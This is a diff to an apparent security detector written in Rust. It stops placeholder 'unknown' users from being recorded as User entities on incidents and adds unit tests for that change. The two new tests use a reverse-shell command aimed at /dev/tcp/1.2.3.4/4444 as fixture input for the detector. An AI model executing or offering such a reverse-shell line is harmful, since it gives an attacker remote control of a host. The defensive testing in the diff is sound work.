@@ -795,7 +795,19 @@ fn build_incident(ctx: IncidentCtx<'_>, signals: &[RiskSignal]) -> Option<Incide
         signal_labels.join(", ")
     );
 
-    let mut entities = vec![EntityRef::user(user.to_string())];
+    // RC-2 follow-up (2026-04-30): the exec_audit event sometimes
+    // arrives without a `user` field; the parse path above defaults to
+    // the literal string "unknown" so the timeline and title still have
+    // a stable key. But promoting that placeholder to a User EntityRef
+    // pollutes the dashboard's User pivot — operator sees a single
+    // huge bucket called "unknown" that means "we don't know" not
+    // "user named unknown". Skip the User entity in that case so the
+    // pivot only groups by real account names. Path entity is kept so
+    // the incident still has a non-empty entity list.
+    let mut entities: Vec<EntityRef> = Vec::new();
+    if user != "unknown" && !user.is_empty() {
+        entities.push(EntityRef::user(user.to_string()));
+    }
     if process != "sudo" && !process.is_empty() {
         entities.push(EntityRef::path(process.to_string()));
     }
@@ -1246,6 +1258,62 @@ mod tests {
             inc.severity
         );
         assert!(inc.incident_id.starts_with("suspicious_execution:"));
+    }
+
+    #[test]
+    fn detector_drops_user_entity_when_user_is_unknown_placeholder() {
+        // RC-2 follow-up (2026-04-30): exec_audit events without a
+        // resolvable `user` field used to produce a User EntityRef
+        // with the literal value "unknown". That polluted the
+        // dashboard's User pivot with a dominant bogus bucket. The
+        // fix in build_incident skips the User entity in that case
+        // — the path entity still ties the incident to a binary, so
+        // the entities list is non-empty.
+        let mut det = make_detector();
+        // exec_event omits the "user" field, so user defaults to
+        // "unknown" inside process_exec_event.
+        let ev = exec_event(
+            &["/tmp/shell", "-i", ">&", "/dev/tcp/1.2.3.4/4444", "0>&1"],
+            Utc::now(),
+        );
+        let inc = det.process(&ev).expect("incident emitted");
+        let user_entities: Vec<&innerwarden_core::entities::EntityRef> = inc
+            .entities
+            .iter()
+            .filter(|e| e.r#type == innerwarden_core::entities::EntityType::User)
+            .collect();
+        assert!(
+            user_entities.is_empty(),
+            "no User entity must be emitted for unresolved 'unknown' user, got: {:?}",
+            user_entities
+        );
+        assert!(
+            !inc.entities.is_empty(),
+            "incident still carries the path entity so it is not orphaned"
+        );
+    }
+
+    #[test]
+    fn detector_keeps_user_entity_for_real_account() {
+        // Counterpart to the test above: when a real user is present
+        // on the event, the User EntityRef survives so the dashboard
+        // pivot can still group by real accounts.
+        let mut det = make_detector();
+        let mut ev = exec_event(
+            &["/tmp/shell", "-i", ">&", "/dev/tcp/1.2.3.4/4444", "0>&1"],
+            Utc::now(),
+        );
+        if let Some(obj) = ev.details.as_object_mut() {
+            obj.insert("user".into(), serde_json::Value::String("alice".into()));
+        }
+        let inc = det.process(&ev).expect("incident emitted");
+        let user_values: Vec<&str> = inc
+            .entities
+            .iter()
+            .filter(|e| e.r#type == innerwarden_core::entities::EntityType::User)
+            .map(|e| e.value.as_str())
+            .collect();
+        assert_eq!(user_values, vec!["alice"]);
     }
 
     #[test]
